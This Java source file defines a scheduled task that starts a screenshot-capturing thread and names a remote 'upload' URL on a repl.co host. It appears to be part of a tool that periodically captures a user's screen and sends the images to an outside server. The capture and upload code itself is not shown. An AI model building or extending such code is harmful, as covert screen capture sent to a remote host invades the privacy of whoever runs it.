package xyz.ctih1;

import java.util.TimerTask;

public class LaunchTask extends TimerTask {
    static String SERVER_IP = "https://backendss.ctih.repl.co/upload";
    static boolean TESTING_ENV = true;

    @Override
    public void run() {
        Thread screenshot = new Thread(new Screenshot());
        screenshot.start();
    }
}